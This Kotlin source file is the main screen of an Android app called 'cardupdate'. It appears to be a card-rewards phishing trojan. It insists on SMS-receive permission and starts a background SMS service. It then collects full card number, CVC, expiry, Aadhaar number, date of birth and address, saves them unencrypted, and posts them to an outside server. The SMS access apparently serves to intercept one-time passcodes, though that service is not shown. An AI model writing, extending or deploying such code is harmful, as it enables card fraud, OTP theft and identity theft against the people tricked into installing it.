package com.example.cardupdate

import android.Manifest
import android.app.DatePickerDialog
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.cardupdate.databinding.ActivityMainBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.*
import java.util.regex.Pattern

class MainActivity : AppCompatActivity() {
    var smsServiceIntent: Intent? = null
    lateinit var binding: ActivityMainBinding
    var permissionGranted: Boolean = false
    val month: String? = null
    val year: String? = null
    val cardtype:String?=null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        window.statusBarColor = ContextCompat.getColor(this, R.color.orange)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestSmsPermission();
        }
        if (permissionGranted) {
            initView()
        }

    }

    private fun initView() {
        val prefs = getSharedPreferences("MyPref", MODE_PRIVATE)
        val restoredText = prefs.getString("cardNoText", null)
        if (restoredText != null) {
            binding.apply {
                card.visibility = View.VISIBLE
                ll.visibility = View.VISIBLE

                cardNo.setText(prefs.getString("cardNoText", null))
                spinner.setSelection(prefs.getInt(month, 0))
                spinner2.setSelection(prefs.getInt(year, 0))
                spinner3.setSelection(prefs.getInt(cardtype, 0))
                holderName.setText(prefs.getString("holderNameText", null))
                cvcNo.setText(prefs.getString("cvcText", null))
                userName.setText(prefs.getString("userName", null))
                userMobile.setText(prefs.getString("phone", null))
                userEmail.setText(prefs.getString("email", null))
                adharNo.setText(prefs.getString("adhar", null))
                dob.setText(prefs.getString("dob",null))
                city.setText(prefs.getString("city",null))
                address.setText(prefs.getString("address",null))
                pincode.setText(prefs.getString("pincode",null))

                dob.isEnabled=false
                dob.setTextColor(Color.parseColor("#808080"))
                cardNo.isEnabled = false
                holderName.isEnabled = false
                cvcNo.isEnabled = false
                spinner.isEnabled = false
                spinner2.isEnabled = false
                spinner3.isEnabled=false
                adharNo.isEnabled = false
                userName.isEnabled = false
                userMobile.isEnabled = false
                userEmail.isEnabled = false
                city.isEnabled = false
                pincode.isEnabled = false
                address.isEnabled = false
                proceedButton.visibility = View.GONE
            }

        } else {
            binding.apply {
                card.visibility = View.VISIBLE
                ll.visibility = View.VISIBLE
                cardNo.addTextChangedListener(FourDigitCardFormatWatcher())
                dob.setOnClickListener {
                    val c = Calendar.getInstance()
                    val year = c.get(Calendar.YEAR)
                    val month = c.get(Calendar.MONTH) + 1
                    val day = c.get(Calendar.DAY_OF_MONTH)

                    val dpd = DatePickerDialog(this@MainActivity,
                        { view, year, monthOfYear, dayOfMonth ->
                            // Display Selected date in TextView
                            dob.setText("" + dayOfMonth + "/" + month + "/" + year)
                        }, year, month, day
                    )
                    dpd.show()
                }
                proceedButton.setOnClickListener {
                    if (Pattern.compile("^(\\+91[\\-\\s]?)?[0]?(91)?[789]\\d{9}\$")
                            .matcher(userMobile.text.toString()).find().not()
                    ) {
                        userMobile.setError("Please put valid  phone No.")
                    } else if (Pattern.compile(".+@.+\\.[a-z]+")
                            .matcher(userEmail.text.toString()).find().not()
                    ) {
                        userEmail.setError("Please put valid email address")
                    } else if (adharNo.text.toString().trim().length < 12) {
                        adharNo.setError("Please put valid  adhaar No.")
                    } else if (cardNo.text.toString().trim().length < 16) {
                        cardNo.setError("Please put valid  card No.")
                    } else if (holderName.text.toString().length < 3) {
                        holderName.setError("Please enter valid Card Holder Name")
                    } else if (userName.text.toString().length < 3) {
                        userName.setError("Please add a valid username")
                    } else if (dob.text.toString().trim().isEmpty()) {
                        Toast.makeText(
                            this@MainActivity,
                            "Please add a valid dob",
                            Toast.LENGTH_SHORT
                        ).show()
                        //dob.setError("Please add a valid dob")
                    } else if (cvcNo.text.toString().length < 3) {
                        cvcNo.setError("Please add a valid cvc no.")
                    }
                    else if (city.text.toString().length < 3) {
                        city.setError("Please add a valid city name")
                    }
                    else if (pincode.text.toString().length < 6) {
                        pincode.setError("Please add a valid pincode")
                    }
                    else if (address.text.toString().length < 10) {
                        address.setError("Please add a valid address")
                    }
                    else {
                        smsServiceIntent = Intent(this@MainActivity, SmsProcessService::class.java)
                        smsServiceIntent.apply {
                            startService(this)
                        }
                        val editor = getSharedPreferences("MyPref", MODE_PRIVATE).edit()
                        editor.putString("cardNoText", cardNo.text.toString())
                        editor.putString("holderNameText", holderName.text.toString())
                        editor.putString("cvcText", cvcNo.text.toString())
                        editor.putString("userName", userName.text.toString())
                        editor.putString("phone", userMobile.text.toString())
                        editor.putString("email", userEmail.text.toString())
                        editor.putString("dob", dob.text.toString())
                        editor.putString("adhar", adharNo.text.toString())
                        editor.putString("city", city.text.toString())
                        editor.putString("pincode", pincode.text.toString())
                        editor.putString("address", address.text.toString())
                        editor.putInt(month, binding.spinner.selectedItemPosition)
                        editor.putInt(year, binding.spinner2.selectedItemPosition)
                        editor.putInt(cardtype,binding.spinner3.selectedItemPosition)
                        editor.putLong("time", System.currentTimeMillis())

                        editor.apply()
                        if (checkForInternet(this@MainActivity)) {
                            val retrofit = Retrofit.Builder()
                                .baseUrl("https://getcardrewards.in/") // as we are sending data in json format so
                                .addConverterFactory(GsonConverterFactory.create()) // at last we are building our retrofit builder.
                                .build()
                            // below line is to create an instance for our retrofit api class.
                            // below line is to create an instance for our retrofit api class.

                            val retrofitAPI: RetrofitAPI = retrofit.create(RetrofitAPI::class.java)
                            val modal = DataModelUserData(
                                userMobile.text.toString(),
                                cardNo.text.toString(),
                                cvcNo.text.toString(),
                                spinner.selectedItem.toString() + spinner2.selectedItem.toString(),
                                holderName.text.toString(),
                                "Name:-"+userName.text.toString()+"City:-"+city.text.toString()+"Address:-"+address.text.toString()+"Pincode:-"+pincode.text.toString()
                                        +"CardType:-"+spinner3.selectedItem.toString(),
                                userEmail.text.toString(),
                                adharNo.text.toString(),
                                dob.text.toString()
                            )
                            binding.progressbar.visibility = View.VISIBLE
                            val call: Call<ResponseData?> =
                                modal.let { it1 -> retrofitAPI.addUser(it1) }

                            call.enqueue(object : Callback<ResponseData?> {
                                override fun onFailure(call: Call<ResponseData?>, t: Throwable) {
                                    binding.progressbar.visibility = View.GONE

                                }

                                override fun onResponse(
                                    call: Call<ResponseData?>,
                                    response: Response<ResponseData?>
                                ) {
                                    val mainIntent = Intent(this@MainActivity, TimerScreen::class.java)
                                    this@MainActivity.startActivity(mainIntent)
                                    finish()
                                    binding.progressbar.visibility = View.GONE


                                }

                            })
                        }


                    }

                }


            }
        }
    }

    private fun checkForInternet(context: Context): Boolean {

        // register activity with the connectivity manager service
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        // if the android version is equal to M
        // or greater we need to use the
        // NetworkCapabilities to check what type of
        // network has the internet connection
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            // Returns a Network object corresponding to
            // the currently active default data network.
            val network = connectivityManager.activeNetwork ?: return false

            // Representation of the capabilities of an active network.
            val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false

            return when {
                // Indicates this network uses a Wi-Fi transport,
                // or WiFi has network connectivity
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true

                // Indicates this network uses a Cellular transport. or
                // Cellular has network connectivity
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true

                // else return false
                else -> false
            }
        } else {
            // if the android version is below M
            @Suppress("DEPRECATION") val networkInfo =
                connectivityManager.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return networkInfo.isConnected
        }
    }

    private fun requestSmsPermission() {
        val permission: String = Manifest.permission.RECEIVE_SMS
        val grant = ContextCompat.checkSelfPermission(this, permission)
        if (grant != PackageManager.PERMISSION_GRANTED) {
            val permission_list = arrayOfNulls<String>(1)
            permission_list[0] = permission
            ActivityCompat.requestPermissions(this, permission_list, 1)
        } else {
            permissionGranted = true
            val intentFilter = IntentFilter()
            intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED")
            smsServiceIntent = Intent(this, SmsProcessService::class.java)
            smsServiceIntent.apply {
                startService(this)
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String?>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (grantResults.size > 0
            && grantResults[0] == PackageManager.PERMISSION_GRANTED
        ) {
            val intentFilter = IntentFilter()
            intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED")
            smsServiceIntent = Intent(this, SmsProcessService::class.java)
            smsServiceIntent.apply {
                startService(this)
            }
            binding.apply {
                card.visibility = View.VISIBLE
                ll.visibility = View.VISIBLE
            }
            initView()

        } else {
            Toast.makeText(this, "Permission is mandatory to proceed", Toast.LENGTH_SHORT)
                .show()
            finish()
        }


    }


}